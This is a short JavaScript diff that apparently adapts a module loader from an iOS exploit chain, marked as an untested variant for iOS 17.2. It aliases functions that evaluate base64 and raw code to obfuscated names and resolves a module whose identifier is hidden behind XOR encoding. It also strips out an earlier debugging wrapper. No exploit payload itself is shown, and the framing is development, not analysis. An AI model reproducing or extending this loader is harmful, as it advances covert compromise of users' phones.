@@ -1,20 +1,20 @@
 // Variant A for iOS 17.2 is untested, might not work
-// 1. Keep our translation layer
+// 1. Core translation for the loader
 globalThis.obChTK = globalThis.moduleManager;
 globalThis.moduleManager.fgPoij = globalThis.moduleManager.evalBase64Module;
 globalThis.moduleManager.hPL3On = globalThis.moduleManager.evalCode;
 
-// 2. The "Spy" - this will catch the exact moment it fails
-const originalGetModule = globalThis.moduleManager.getModuleByName;
-globalThis.moduleManager.getModuleByName = function(id) {
-    const module = originalGetModule.apply(this, arguments);
-    if (!module) {
-        alert("CRASH PREVENTED!\nScript asked for missing module:\n" + id);
-        // Return an empty object so it doesn't throw the 'destructure' error immediately
-        return {}; 
-    }
-    return module;
-};
+// 2. Define the Platform Module exactly how the script expects it
+const platformModule = globalThis.moduleManager.getModuleByName(([88, 93, 95, 95, 80, 10, 8, 90, 11, 88, 92, 88, 80, 11, 8, 91, 8, 81, 15, 93, 89, 11, 12, 91, 81, 94, 15, 95, 93, 95, 13, 93, 13, 94, 92, 80, 90, 12, 11, 89].map(x => {
+    return String.fromCharCode(x ^ 105);
+}).join("")));
+
+// 3. Define the Utility Module (The other one we found)
+const utilsModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
+
+// 4. Emergency Alias: If the script looks for 'P' or 'x', give it the modules
+const P = platformModule;
+const x = utilsModule;
 
 
 let r = {};
